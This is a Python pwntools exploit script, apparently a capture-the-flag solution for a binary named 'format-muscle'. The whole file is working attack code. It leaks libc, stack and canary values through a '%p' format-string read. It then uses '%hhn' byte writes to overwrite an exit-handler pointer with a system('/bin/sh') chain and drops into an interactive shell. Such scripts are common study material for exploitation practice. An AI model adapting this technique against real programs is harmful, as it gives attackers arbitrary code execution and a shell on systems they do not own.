from pwn import *
import time
context(log_level = 'debug')

r = process("./format-muscle")
libc = ELF("./libc.so.6")

lg = lambda s: log.info('\033[1;32;40m%s --> 0x%x\033[0m' % (s, eval(s)))

first_debug = 1
debugging = 1
pausing = 1
def debug(*args):
    global first_debug
    if not debugging: return
    if first_debug:
        gdb.attach(r, *args)
        first_debug = 0
    if pausing: pause()

def parse_u64(raw):
    assert len(raw) <= 8
    return u64(raw.ljust(8, b'\0'))

def parse_int(raw):
    tokens = b'box0123456789abcdef'
    ret = ''
    for i in raw:
        if i not in tokens:
            return int(ret, 0)
        else:
            ret += chr(i)
    return int(ret, 0)

def wait():
    time.sleep(0.01)

r.sendline(b'%p,'*42 + b'END')
data = list(map(parse_int, r.recvuntil(b'END', drop = 1).split(b',')[:-1]))
# tel $rbp-0x1c8 50
libc_base = data[ 0]  - 0x0ae26a
base      = data[32]  - 0x001199
canary    = data[38]
rbp       = data[34]  - 0x48
rsp       = rbp       - 0x110
pop_rdi   = libc_base + 0x0152a1
pop_rsi   = libc_base + 0x01b0a1
bin_sh    = libc_base + 0x0ab1f3
system    = libc_base + 0x04e0c0
ret       = libc_base + 0x0152a2
qword_AFC48 = libc_base + 0x0afc48
lg('libc_base')
lg('base')
lg('canary')
lg('rbp')
lg('rsp')

def template(victim, target):
    for i in range(6):
        v = p64(target)[i]
        assert v-8 > 0
        payload = b'%c'*8 + f'%{(v-8) & 0xff}c%hhn'.encode()
        payload = payload.ljust(0x20) + p64(victim + i)
        r.sendline(payload)

template(qword_AFC48, rsp + 0x10)
template(rsp + 256, system)
template(rsp + 512, bin_sh)
#debug('b *(main+92)')
r.sendline(b'quit'*4 + p64(rsp))

#debug('b *(__funcs_on_exit+82)')


r.clean()
r.interactive()
r.close()